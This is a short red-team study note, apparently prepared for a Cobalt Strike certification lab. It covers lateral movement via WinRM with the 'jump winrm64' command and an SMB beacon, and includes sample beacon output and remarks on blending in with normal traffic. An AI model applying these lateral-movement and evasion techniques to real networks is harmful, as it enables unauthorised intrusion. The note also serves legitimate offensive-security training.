
Windows official tool for remotely manage, automate, and administer remote systems from different vendors.

The `winrm` and `winrm64` methods can be used for 32 and 64-bit targets as appropriate.

## 🖊️ via [[Cobalt Strike]]

The SMB Beacon is an excellent choice when moving laterally, because the SMB protocol is used extensively in a Windows environment, so this traffic blends in very well.

For example:

```
beacon> jump winrm64 web.dev.cyberbotic.io smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web.dev.cyberbotic.io via WinRM
[+] host called home, sent: 225172 bytes
[+] established link to child beacon: 10.10.122.30
```

Here, we are moving laterally (assuming our current [[Access Token]] allows it to) into wed.dev server, via an smb beacon. 

WinRM will return a high integrity Beacon running as the user with which you're interacting with the remote machine as:

![[winrm.png]]

This new Beacon will be running inside `wsmprovhost.exe`, which is the "Host process for WinRM plug-ins".  This is used whenever WinRM is used, legitimate or otherwise.


### ⚠ Opsec




### Properties
---
📆 created   {{14-02-2024}} 11:37
🏷️ tags: #redteam #crto #Windows 

---

